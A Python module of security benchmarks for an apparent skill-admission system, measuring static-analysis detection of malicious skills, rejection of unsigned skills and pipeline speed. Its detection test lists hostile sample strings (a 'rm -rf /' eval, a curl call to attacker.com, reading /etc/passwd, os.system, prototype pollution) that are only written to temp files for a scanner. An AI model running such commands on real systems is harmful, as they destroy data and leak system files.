"""Security benchmarks: malicious skill detection, sandbox escape, signature verification."""

from __future__ import annotations

import tempfile
import time
from pathlib import Path

from euxis_ops.benchmarks.runner import BenchmarkResult, BenchmarkRunner


def _bench_malicious_detection() -> BenchmarkResult:
    """Benchmark malicious skill pattern detection rate."""
    from euxis_bridge.core.static_analysis import analyze_file

    malicious_samples = [
        ("evil.js", 'const x = eval("rm -rf /");'),
        ("stealer.js", 'const cp = require("child_process"); cp.exec("curl attacker.com");'),
        ("inject.py", 'exec(open("/etc/passwd").read())'),
        ("import_attack.py", '__import__("os").system("whoami")'),
        ("proto.js", 'obj.__proto__.isAdmin = true;'),
    ]
    clean_samples = [
        ("safe.js", 'console.log("hello world");'),
        ("safe.py", 'print("hello world")'),
    ]

    detected = 0
    false_positives = 0

    with tempfile.TemporaryDirectory() as tmp:
        start = time.monotonic()
        for name, content in malicious_samples:
            path = Path(tmp) / name
            path.write_text(content, encoding="utf-8")
            findings = analyze_file(path)
            if any(f.severity == "critical" for f in findings):
                detected += 1

        for name, content in clean_samples:
            path = Path(tmp) / name
            path.write_text(content, encoding="utf-8")
            findings = analyze_file(path)
            if any(f.severity == "critical" for f in findings):
                false_positives += 1

        elapsed = (time.monotonic() - start) * 1000

    detection_rate = detected / len(malicious_samples) if malicious_samples else 0
    return BenchmarkResult(
        name="malicious_detection",
        suite="security",
        passed=detection_rate >= 0.8 and false_positives == 0,
        duration_ms=elapsed,
        metrics={
            "detection_rate": round(detection_rate, 3),
            "detected": detected,
            "total_malicious": len(malicious_samples),
            "false_positives": false_positives,
        },
    )


def _bench_tampered_skill_rejection() -> BenchmarkResult:
    """Benchmark rejection of unsigned/tampered skills."""
    from euxis_bridge.core.verification import verify_skill_signature

    with tempfile.TemporaryDirectory() as tmp:
        entry = Path(tmp) / "index.js"
        entry.write_text("console.log('tampered');", encoding="utf-8")

        start = time.monotonic()
        # No signature file = should fail verification
        result = verify_skill_signature(entry, "/nonexistent/key.pub")
        elapsed = (time.monotonic() - start) * 1000

    return BenchmarkResult(
        name="tampered_skill_rejection",
        suite="security",
        passed=result is False,
        duration_ms=elapsed,
        metrics={"rejected": not result},
    )


def _bench_admission_pipeline() -> BenchmarkResult:
    """Benchmark admission pipeline throughput."""
    from euxis_bridge.core.admission import AdmissionPipeline

    pipeline = AdmissionPipeline()

    with tempfile.TemporaryDirectory() as tmp:
        skill_dir = Path(tmp) / "clean-skill"
        skill_dir.mkdir()
        (skill_dir / "index.js").write_text('module.exports = () => "ok";', encoding="utf-8")

        start = time.monotonic()
        iterations = 10
        for _ in range(iterations):
            result = pipeline.evaluate(skill_dir)
        elapsed = (time.monotonic() - start) * 1000

    avg_ms = elapsed / iterations
    return BenchmarkResult(
        name="admission_pipeline_throughput",
        suite="security",
        passed=avg_ms < 500,
        duration_ms=elapsed,
        metrics={"iterations": iterations, "avg_ms": round(avg_ms, 2), "admitted": result.admitted},
    )


def register_benchmarks(runner: BenchmarkRunner) -> None:
    runner.register("security", _bench_malicious_detection)
    runner.register("security", _bench_tampered_skill_rejection)
    runner.register("security", _bench_admission_pipeline)
